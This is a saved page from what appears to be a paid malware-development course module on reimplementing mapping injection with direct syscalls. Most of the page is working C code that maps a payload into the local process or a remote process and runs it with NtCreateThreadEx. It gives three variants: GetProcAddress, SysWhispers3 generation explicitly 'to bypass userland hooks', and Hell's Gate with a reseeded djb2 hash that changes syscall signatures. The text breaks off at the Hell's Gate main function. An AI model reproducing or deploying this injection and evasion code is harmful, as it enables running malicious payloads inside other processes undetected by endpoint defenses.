<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/css2.css" rel="stylesheet">
        <link href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/css2_002.css" rel="stylesheet">
        <title>Syscalls - Reimplementing Mapping Injection</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/app.fdbb573b.css"><link rel="stylesheet" href="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 68 - Syscalls - Reimplementing Mapping Injection
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/SyscallsMappingInjection" target="_blank">
                    <img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Syscalls - Reimplementing Mapping Injection</h2>
<h3>Introduction</h3>
<p>In this module, the mapping injection technique discussed earlier 
will be implemented using direct syscalls, replacing WinAPIs with their 
syscall equivalent.</p>
<ul>
<li>
<p><code>CreateFileMapping</code> is replaced with <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection" target="_blank">NtCreateSection</a></p>
</li>
<li>
<p><code>MapViewOfFile</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html" target="_blank">NtMapViewOfSection</a></p>
</li>
<li>
<p><code>CloseHandle</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FType%20independed%2FNtClose.html" target="_blank">NtClose</a></p>
</li>
<li>
<p><code>UnmapViewOfFile</code> is replaced with <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtUnmapViewOfSection.html" target="_blank">NtUnmapViewOfSection</a></p>
</li>
</ul>
<h3>Syscall Parameters</h3>
<p>This section will go through the syscalls that will be used and explain their parameters.</p>
<h4>NtCreateSection</h4>
<p>This is the resulting syscall from the <code>CreateFileMapping</code> WinAPI. <code>NtCreateSection</code> is shown below.</p>
<pre><code>NTSTATUS NtCreateSection(
  OUT PHANDLE             SectionHandle,          // Pointer to a HANDLE variable that receives a handle to the section object
  IN ACCESS_MASK          DesiredAccess,          // The type of the access rights to section handle 
  IN POBJECT_ATTRIBUTES   ObjectAttributes,       // Pointer to an OBJECT_ATTRIBUTES structure (set to NULL) 
  IN PLARGE_INTEGER       MaximumSize,            // Maximum size of the section
  IN ULONG                SectionPageProtection,  // Protection to place on each page in the section
  IN ULONG                AllocationAttributes,   // Allocation attributes of the section (SEC_XXX flags) 
  IN HANDLE               FileHandle              // Optionally specifies a handle for an open file object (set to NULL)
);
</code></pre>
<p>While <code>NtCreateSection</code> and <code>CreateFileMapping</code> have many similarities, some parameters are new. First, the <code>DesiredAccess</code> parameter describes the type of access rights for the section handle. The list of options is shown in the image below.</p>
<p><img src="Syscalls%20-%20Reimplementing%20Mapping%20Injection_files/syscall-mapping-114492060-65bb4d32-e61b-4489-b768-f4ef662928.png" alt="image"></p>
<p>In this module, either <code>SECTION_ALL_ACCESS</code> or <code>SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE</code> will suffice.</p>
<p>Next, the <code>MaximumSize</code> parameter is a pointer to a <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-large_integer-r1" target="_blank">LARGE_INTEGER</a> structure. The only element that needs to be populated is the <code>LowPart</code> element which will be equal to the payload's size. The <code>LARGE_INTEGER</code> structure is shown below.</p>
<pre><code>typedef union _LARGE_INTEGER {
  struct {
    DWORD LowPart;
    LONG  HighPart;
  } DUMMYSTRUCTNAME;
  struct {
    DWORD LowPart;
    LONG  HighPart;
  } u;
  LONGLONG QuadPart;
} LARGE_INTEGER; 
</code></pre>
<p>Finally, the <code>AllocationAttributes</code> parameter specifies a bitmask of <code>SEC_XXX</code> flags that determines the allocation attributes of the section. The list of flags can be found <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga" target="_blank">here</a> under the <code>flProtect</code> parameter. In this module, this parameter will be set to <code>SEC_COMMIT</code>.</p>
<h4>NtMapViewOfSection</h4>
<p>This is the resulting syscall from the <code>MapViewOfFile</code> WinAPI. <code>NtMapViewOfSection</code> is shown below.</p>
<pre><code>NTSTATUS NtMapViewOfSection(
  IN HANDLE               SectionHandle,            // HANDLE to Section Object created by 'NtCreateSection'
  IN HANDLE               ProcessHandle,            // Process handle of the process to map the view to
  IN OUT PVOID            *BaseAddress,             // Pointer to a PVOID variable that receives the base address of the view
  IN ULONG                ZeroBits,                 // set to NULL
  IN SIZE_T               CommitSize,               // set to NULL  
  IN OUT PLARGE_INTEGER   SectionOffset,            // set to NULL
  IN OUT PSIZE_T          ViewSize,                 // A pointer to a SIZE_T variable that contains the size of the memory to be allocated
  IN SECTION_INHERIT      InheritDisposition,       // How the view is to be shared with child processes
  IN ULONG                AllocationType,           // type of allocation to be performed (set to NULL)
  IN ULONG                Protect                   // Protection for the region of allocated memory
);
</code></pre>
<p>For more documentation on each parameter, reference Microsoft's documentation on <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection" target="_blank">ZwMapViewOfSection</a>. The <code>Zw</code> documentation can be used if Microsoft is missing the <code>Nt</code> documentation, which is the case with this syscall.</p>
<p>Some points need to be discussed about the following parameters:</p>
<p>First, the <code>ViewSize</code> parameter rounds up to the nearest multiple of a page size (recall that the page size is <code>4096</code> bytes).</p>
<p>Next, the <code>InheritDisposition</code> parameter is derived from the <code>SECTION_INHERIT</code> enum. It can be set to one of two values</p>
<ol>
<li>
<p><code>ViewShare</code> which maps the view into any child processes that are created in the future.</p>
</li>
<li>
<p><code>ViewUnmap</code> which does not map the view into any child processes.</p>
</li>
</ol>
<p>The <code>SECTION_INHERIT</code> enum is shown below.</p>
<pre><code>typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;
</code></pre>
<p>In this module, the value will always be <code>ViewUnmap</code> because the implementation does not create any child processes.</p>
<p>Finally, the <code>Protect</code> parameter specifies the type of protection for the allocated memory which can be any value found <a href="https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants" target="_blank">here</a>.</p>
<h4>NtUnmapViewOfSection</h4>
<p>This is the resulting syscall from the <code>UnmapViewOfFile</code> WinAPI. <code>NtUnmapViewOfSection</code> is shown below.</p>
<pre><code>NTSTATUS NtUnmapViewOfSection(
  IN HANDLE               ProcessHandle,    // Process handle of the process that contains the view to unmap
  IN PVOID                BaseAddress       // Base address of the view to unmap
);
</code></pre>
<h4>NtClose</h4>
<p>This is the resulting syscall from the <code>CloseHandle</code> WinAPI. <code>NtClose</code> is shown below.</p>
<pre><code>NTSTATUS NtClose(
  IN HANDLE               ObjectHandle    // Handle of the object to close
);
</code></pre>
<p><code>NtClose</code> syscall will be used to close the handle of a section created using <code>NtCreateSection</code>.</p>
<h3>Implementation Using GetProcAddress and GetModuleHandle</h3>
<p>The next step is to implement the mapping injection technique using 
the previously shown syscalls. Similarly to the previous module, it will
 be shown using three methods, starting with using <code>GetProcAddress</code> and <code>GetModuleHandle</code>.</p>
<p>A <code>Syscall</code> structure is created and initialized using <code>InitializeSyscallStruct</code>, which holds the addresses of the syscalls used, as shown below.</p>
<pre><code>// a structure used to keep the syscalls used
typedef struct _Syscall {
	
	fnNtCreateSection       pNtCreateSection;
	fnNtMapViewOfSection    pNtMapViewOfSection;
	fnUnmapViewOfSection    pNtUnmapViewOfSection;
	fnNtClose               pNtClose;
	fnNtCreateThreadEx      pNtCreateThreadEx;

}Syscall, * PSyscall;



// function used to populate the input 'St' structure
BOOL InitializeSyscallStruct (OUT PSyscall St) {

	HMODULE hNtdll	= GetModuleHandle(L"NTDLL.DLL");
	if (!hNtdll) {
		printf("[!] GetModuleHandle Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	St-&gt;pNtCreateSection         = (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	St-&gt;pNtMapViewOfSection      = (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	St-&gt;pNtUnmapViewOfSection    = (fnUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
	St-&gt;pNtClose                 = (fnNtClose)GetProcAddress(hNtdll, "NtClose");
	St-&gt;pNtCreateThreadEx        = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

 	// check if GetProcAddress missed a syscall
	if (St-&gt;pNtCreateSection == NULL || St-&gt;pNtMapViewOfSection == NULL || St-&gt;pNtUnmapViewOfSection == NULL || St-&gt;pNtClose == NULL || St-&gt;pNtCreateThreadEx == NULL)
		return FALSE;
	else
		return TRUE;
}

</code></pre>
<p>The <code>LocalMappingInjectionViaSyscalls</code> and <code>RemoteMappingInjectionViaSyscalls</code> functions are responsible for injecting the payload (<code>pPayload</code>) in the local process and remote process (<code>hProcess</code>), respectively. Both functions are shown below.</p>
<h4>LocalMappingInjectionViaSyscalls</h4>
<pre><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection		= NULL;
	HANDLE				hThread			= NULL;
	PVOID				pAddress		= NULL;
	NTSTATUS			STATUS			= NULL;
	SIZE_T				sViewSize		= NULL;
	LARGE_INTEGER		MaximumSize		= {
			.HighPart = 0, 
			.LowPart = sPayloadSize 
	};
	Syscall				St			    = { 0 };

	// Initializing the 'St' structure to fetch the syscall's addresses
	if (!InitializeSyscallStruct(&amp;St)) {
		printf("[!] Could Not Initialize The Syscall Struct \n");
		return FALSE;
	}

//--------------------------------------------------------------------------	
	// Allocating local map view 

	if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sViewSize);

//--------------------------------------------------------------------------	
	// Writing the payload

	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAddress);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation

	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------
	
	// Unmpaing the local view - only when the payload is done executing
	if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// Closing the section handle
	if ((STATUS = St.pNtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h4>RemoteMappingInjectionViaSyscalls</h4>
<pre><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
					    pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize 		= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};
	Syscall				St				    = { 0 };


	if (!InitializeSyscallStruct(&amp;St)) {
		printf("[!] Could Not Initialize The Syscall Struct \n");
		return FALSE;
	}

//--------------------------------------------------------------------------
	// Allocating local map view 

	if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewUnmap, NULL, PAGE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// Allocating remote map view 
	if ((STATUS = St.pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------
	
	// Executing the payload via thread creation
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pRemoteAddress);
	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------
	
	// Unmapping the local view - only when the payload is done executing
	if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	
	// Closing the section handle
	if ((STATUS = St.pNtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

</code></pre>
<p>The <code>NtUnmapViewOfSection</code> function should only be 
executed after the payload has finished executing. Attempting to unmap 
the mapped local view while the payload is still running could break the
 payload execution or cause a process to crash. As an alternative, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntwaitforsingleobject" target="_blank">NtWaitForSingleObject</a> syscall can be used to wait until the thread is finished, after which the <code>NtUnmapViewOfSection</code> syscall can be performed to clean up the mapped payload, though this is left as an exercise to the reader.</p>
<h3>Implementation Using SysWhispers</h3>
<p>The implementation here uses SysWhispers3 to bypass userland hooks 
via direct syscalls. The following command is used to generate the 
required files for this implementation.</p>
<pre><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtCreateSection,NtMapViewOfSection,NtUnmapViewOfSection,NtClose,NtCreateThreadEx -o SysWhispers -v*
</code></pre>
<p>Three files are generated: <code>SysWhispers.h</code>, <code>SysWhispers.c</code> and <code>SysWhispers-asm.x64.asm</code>. The next step is to import these files into Visual Studio as demonstrated in the previous module. <code>LocalMappingInjectionViaSyscalls</code> and <code>RemoteMappingInjectionViaSyscalls</code> are shown below.</p>
<h4>LocalMappingInjectionViaSyscalls</h4>
<pre><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection		= NULL;
	HANDLE				hThread			= NULL;
	PVOID				pAddress		= NULL;
	NTSTATUS			STATUS			= NULL;
	SIZE_T				sViewSize		= NULL;
	LARGE_INTEGER		MaximumSize		= {
			.HighPart = 0, 
			.LowPart = sPayloadSize 
	};

//--------------------------------------------------------------------------	
	// Allocating local map view 
	
	if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] Allocated Address At : 0x%p Of Size : %d \n", pAddress, sViewSize);

//--------------------------------------------------------------------------	
	
	// Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAddress);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation

	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pAddress);
	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// Closing the section handle
	if ((STATUS = NtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre>
<h4>RemoteMappingInjectionViaSyscalls</h4>
<pre><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
					    pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize 		= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// Allocating local map view 

	if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pLocalAddress, sViewSize);

//--------------------------------------------------------------------------
	
	// Writing the payload
	printf("[#] Press &lt;Enter&gt; To Write The Payload ... ");
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// Allocating remote map view 
	if ((STATUS = NtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------
	
	// Executing the payload via thread creation
	printf("[#] Press &lt;Enter&gt; To Run The Payload ... ");
	getchar();
	printf("\t[i] Running Thread Of Entry 0x%p ... ", pRemoteAddress);
	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	printf("[+] DONE \n");
	printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}
	
	// Closing the section handle
	if ((STATUS = NtClose(hSection)) != 0) {
		printf("[!] NtClose Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

</code></pre>
<h3>Implementation Using Hell's Gate</h3>
<p>The last implementation for this module is using Hell's Gate. First, 
ensure that the same steps done to set up the Visual Studio project with
 SysWhispers3 are done here too. Specifically, enabling MASM and 
modifying the properties to set the ASM file to be compiled using the 
Microsoft Macro Assembler.</p>
<h4>Updating The VX_TABLE Structure</h4>
<pre><code>typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;
</code></pre>
<h4>Updating Seed Value</h4>
<p>A new seed value will be used to replace the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93" target="_blank">old one</a> to change the hash values of the syscalls. The djb2 hashing function is updated with the new seed value below.</p>
<pre><code>DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
	INT c;

	while (c = *str++)
		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

	return dwHash;
}
</code></pre>
<p>The following <code>printf</code> statements should be added to a new project to generate the djb2 hash values.</p>
<pre><code>printf("#define %s%s 0x%p \n", "NtCreateSection", "_djb2", (DWORD64)djb2("NtCreateSection"));
printf("#define %s%s 0x%p \n", "NtMapViewOfSection", "_djb2", djb2("NtMapViewOfSection"));
printf("#define %s%s 0x%p \n", "NtUnmapViewOfSection", "_djb2", djb2("NtUnmapViewOfSection"));
printf("#define %s%s 0x%p \n", "NtClose", "_djb2", djb2("NtClose"));
printf("#define %s%s 0x%p \n", "NtCreateThreadEx", "_djb2", djb2("NtCreateThreadEx"));
</code></pre>
<p>Once the values are generated, add them to the start of the Hell's Gate project.</p>
<pre><code>#define NtCreateSection_djb2         0x5687F81AC5D1497A
#define NtMapViewOfSection_djb2      0x0778E82F702E79D4
#define NtUnmapViewOfSection_djb2    0x0BF2A46A27B93797
#define NtClose_djb2                 0x0DA4FA80EF5031E7
#define NtCreateThreadEx_djb2        0x2786FB7E75145F1A
</code></pre>
<h4>Updating The Main Function</h4>
<p>The main function must be updated to use either the <code>LocalMappingInjectionViaSyscalls</code> or <code>RemoteMappingInjectionViaSyscalls</code> functions instead of the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80" target="_blank">payload function</a>. The function will use the above-generated hashes as shown below.</p>
<h4>LocalMappingInjectionViaSyscalls</h4>
